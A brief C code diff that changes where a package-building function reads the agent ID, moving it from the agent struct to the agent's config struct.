@@ -41,7 +41,7 @@ pPackage CreatePackageWithMetaData(UINT32 CommandID, pAgent Agent) {
 		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
-	if ((err = AddInt32ToPackage(pack, Agent->AgentID)) != PACKAGE_SUCCESS) {
+	if ((err = AddInt32ToPackage(pack, Agent->config->AgentID)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
